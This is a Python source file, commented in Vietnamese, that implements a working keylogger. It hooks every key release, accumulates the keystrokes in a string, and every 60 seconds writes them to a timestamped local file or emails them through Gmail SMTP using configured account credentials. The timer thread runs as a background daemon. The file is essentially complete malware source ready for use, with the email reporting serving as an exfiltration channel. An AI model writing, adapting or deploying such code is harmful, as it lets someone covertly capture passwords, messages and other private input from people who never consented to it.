# Keylogger 
# Xây dựng theo tiêu chí : 
# - Ghi lại các phím được nhấn và lưu nó vào biến chuỗi toàn cục 
# - Nghe các tổ hợp phím 
# Sau mỗi n giây , báo cáo nội dung của biến chuỗi này lên tệp cục bộ (thông qua FTP hoặc Google Drive API) hoặc qua email

import keyboard
import smtplib # thư viện dùng để gửi email - gửi mail bằng SMTP protocol 
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart # định dạng email
from email.mime.text import MIMEText  # gửi email dạng text

SEND_REPORT_EVERY = 60 # gửi báo cáo mỗi 60 giây
EMAIL_ADDRESS = ""
EMAIL_PASSWORD = ""

# Tạo một lớp Keylogger và mỗi method trong class này sẽ thực hiện một nhiệm vụ cụ thể 
class KeyLogger : 
    def __init__(self , interval , report_method = "email"):
        self.interval = interval
        self.report_method = report_method
        # strings chứa các phím được nhấn
        self.log = ""
        # thời gian bắt đầu và kết thúc
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
    def callback(self , event) :
        # hàm này sẽ được gọi mỗi khi một phím được nhấn
        name = event.name  
        if len(name) > 1 : 
            # Không phải là 1 kí tự , có thể là phím đặc biệt (space , enter , ctrl , shift , etc)
            # Viết hoa với [] 
            if name == "space" :
                name = " "
            elif name == "enter" :
                name = "[ENTER]\n"
            elif name == "decimal" :
                name = "."
            else :
                # thay thế khoảng trắng bằng dấu gạch dưới
                name = name.replace(" " , "_")
                name = f"[{name.upper()}]"
        # Thêm kí tự vào log
        self.log += name 
# Reporting to Text Files 
# Gửi báo cáo qua text file 
    def update_filename (self) : 
        start_dt_str = str(self.start_dt)[:-7].replace(" " , "-").replace(":" , "")
        end_dt_str = str(self.end_dt)[:-7].replace(" " , "-").replace(":" , "")
        self.filename = f"kelog-{start_dt_str}_{end_dt_str}"
    def report_to_file(self) : 
        with open (f"{self.filename}.txt" , "w") as f  :
            print(self.log , file = f) 
            # ghi bằng print 
            # tự động thêm dấu xuống dòng như khi in ra màn hình 
        print(f"[+] Saved {self.filename}.txt")

# Reporting via Email 
    def prepare_email(self , message)  : 
        msg = MIMEMultipart("alternative") # email đa phần  - gửi nhiều định dạng emai - text hoặc html
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger Logs" 
        html = f"<p>{message}</p>"
        text_part = MIMEText(message , "plain")
        html_part = MIMEText(html , "html")
        msg.attach(text_part)
        msg.attach(html_part)
        # sau khi tạo xong email , chuyển nó thành string để có thể gửi qua SMTP 
        return msg.as_string() 
    
    def sendmail(self , email ,password , message , verbose = 1) :
        server = smtplib.SMTP(host = "smtp.gmail.com" , port = 587)
        server.starttls() # kết nối với server bằng TLS
        server.login(email , password)
        server.sendmail(email , email , self.prepare_email(message))
        server.quit() 
        if verbose :  
            print(f"[+] {datetime.now()} - Send email to {email} containing {message}")
    # Gửi báo cáo mỗi n giây 
    def report(self) :
        # Gửi log và reset log sau mỗi n giây
        if self.log :
            self.end_dt = datetime.now() 
            self.update_filename() 
            if self.report_method == "email" :
                self.sendmail(EMAIL_ADDRESS , EMAIL_PASSWORD , self.log)
            elif self.report_method == "file" :
                self.report_to_file() 
                print(f"[{self.filename}.txt] - {self.log}")
            self.start_dt = datetime.now() 
        self.log = ""
        # Tạo timer để chạy lại report() sau mỗi self.interval giây 
        timer = Timer(interval = self.interval , function = self.report)
        timer.daemon = True # chạy timer như một daemon - chạy ngầm 
        # Giúp chương trình kết thúc mà không cần phải chờ timer kết thúc
        timer.start()
    def start(self) :
        self.start_dt = datetime.now()
        keyboard.on_release(callback = self.callback) 
        self.report()
        print(f"[+] Started at {self.start_dt}") 
        # chặn thread chính , wait cho đến khi CTRL + C được nhấn
        keyboard.wait()


if __name__ == "__main__" :
    keylogger = KeyLogger(interval = SEND_REPORT_EVERY , report_method = "file")
    keylogger.start()